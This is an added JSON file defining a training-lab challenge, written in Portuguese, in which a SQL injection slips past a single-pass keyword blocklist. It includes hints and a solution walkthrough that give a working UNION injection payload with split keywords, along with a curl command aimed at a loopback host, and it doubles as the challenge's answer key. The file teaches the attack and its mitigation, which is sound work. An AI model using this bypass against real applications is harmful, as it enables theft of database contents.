@@ -1,0 +1,80 @@
+{
+  "slug": "sqli-waf-bypass",
+  "title": "O filtro que não era",
+  "codename": "NORTHWIND SUPPLY",
+  "summary": "Um console legado de busca de suprimentos anexa um fragmento de filtro fornecido pelo chamador a uma query de três colunas. Uma blocklist de palavras-chave remove termos perigosos uma única vez, o que é exatamente o suficiente para ser bypassada re-dividindo-os.",
+  "category": "sqli",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "sqli-waf-bypass",
+  "estimated_minutes": 25,
+  "xp": 330,
+  "tech": [
+    "Flask",
+    "SQLite",
+    "Python"
+  ],
+  "tags": [
+    "sql-injection",
+    "waf-bypass",
+    "union-based",
+    "keyword-filter"
+  ],
+  "story": "O console de suprimentos da Northwind é um remanescente da era da logística de campo. Ele aceita um fragmento de filtro SQL cru, e a segurança adicionou uma regex que remove `union` e `select`. A regex roda uma vez e não repete até estabilizar, então uma palavra-chave remontada sobrevive.",
+  "objective": "Bypasse o filtro de palavras-chave com uma palavra dividida, faça UNION de uma linha da tabela `vault` no resultado de três colunas de produtos e submeta o segredo.",
+  "rules": "Fique na origem loopback atribuída. O banco é um arquivo SQLite descartável do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo da linha do vault",
+      "flag_type": "user",
+      "points": 330,
+      "required": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia o formato da query",
+      "body": "O console monta `SELECT id, name, description FROM products WHERE name LIKE '%' <ql>`. Qualquer coisa que você adicionar precisa ser um fragmento SQL válido. Teste `AND name LIKE '%tent%'` primeiro para ver como ele se comporta.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Blocklists não são parsers",
+      "body": "`union` e `select` são removidos sem diferenciar maiúsculas em uma única passada. Se remover uma palavra criar outra, a nova nunca é verificada. `UNunionION` vira `UNION`.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Três colunas, um segredo",
+      "body": "Use `UNunionION SELselectECT 999,'x',secret FROM vault -- `. A query de produtos seleciona três colunas, então o UNION precisa fornecer três. A linha do vault aparece como um card extra.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "Abra `/search` e envie o fragmento de filtro:\n\n```\nUNunionION SELselectECT 999,'x',secret FROM vault -- \n```\n\nA regex remove o `union` e o `select` internos, deixando um `UNION SELECT` válido que anexa uma linha do vault ao resultado de produtos. A página renderiza a linha como um card contendo a flag.\n\n```bash\ncurl 'http://127.0.0.1:PORT/search' --get --data-urlencode \"q=UNunionION SELselectECT 999,'x',secret FROM vault -- \"\n```",
+    "root_cause": "A aplicação anexa entrada não confiável diretamente ao SQL e depois tenta compensar com uma blocklist de palavras-chave de uma passada. Substituição por blocklist não consegue parsear SQL: variação de maiúsculas, comentários, encoding e divisão de palavras derrotam filtros ingênuos, e o filtro aqui pode até criar a palavra-chave proibida que deveria remover.",
+    "mitigation": "Nunca monte SQL a partir de strings. Use queries parametrizadas ou um query builder e passe o termo do usuário como valor vinculado. Não aceite um fragmento SQL cru do cliente. Se um filtro for necessário, implemente-o como um conjunto estruturado e com allowlist de operadores, em vez de substituição textual."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — SQL injection UNION attacks",
+      "url": "https://portswigger.net/web-security/sql-injection/union-attacks",
+      "source_type": "official",
+      "description": "Recuperação de dados de outras tabelas com UNION."
+    },
+    {
+      "title": "OWASP — SQL Injection Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Queries parametrizadas e defesa em profundidade."
+    },
+    {
+      "title": "CWE-89 — SQL Injection",
+      "url": "https://cwe.mitre.org/data/definitions/89.html",
+      "source_type": "standard",
+      "description": "Neutralização inadequada da sintaxe SQL."
+    }
+  ]
+}
